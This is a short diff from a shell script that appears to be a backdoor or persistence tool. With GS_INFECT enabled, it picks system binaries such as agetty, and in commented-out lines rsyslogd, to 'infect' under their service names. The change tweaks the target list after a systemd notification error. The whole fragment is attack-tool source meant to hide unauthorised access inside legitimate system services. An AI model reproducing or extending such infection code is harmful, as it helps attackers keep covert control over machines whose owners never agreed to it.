@@ -168,7 +168,11 @@ GS_INFECT=1
 # 	INFECT_BIN_NAME_ARR+=("${res:?}")
 # 	INFECT_SYSCTL_NAME_ARR+=("systemd-udevd")
 # }
-# => Only main pid is allowed to signal systemd
+# res=$(command -v rsyslogd) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("rsyslog")
+# }
+# => Got notification message from PID 52031, but reception only permitted for main PID 52029
 res=$(command -v agetty) && {
 	INFECT_BIN_NAME_ARR+=("${res:?}")
 	INFECT_SYSCTL_NAME_ARR+=("getty@tty1")
